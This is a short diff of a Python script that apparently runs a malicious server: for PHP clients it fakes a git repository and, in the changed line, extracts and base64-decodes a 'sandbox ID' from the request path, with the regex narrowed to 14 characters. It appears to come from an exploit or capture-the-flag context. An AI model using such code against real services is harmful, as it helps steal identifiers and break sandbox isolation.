@@ -283,7 +283,7 @@ if __name__ == '__main__':
             else:
                 print('This is PHP! Showing them something that looks like a git repo and stealing sandbox ID')
 
-                b64_sandbox_id = re.search(b'GET /(.*?)/', http_request).group(1)
+                b64_sandbox_id = re.search(b'GET /(.{14})/', http_request).group(1)
                 while len(b64_sandbox_id) % 4 != 0:
                     b64_sandbox_id += b'='
                 sandbox_id = base64.b64decode(b64_sandbox_id)
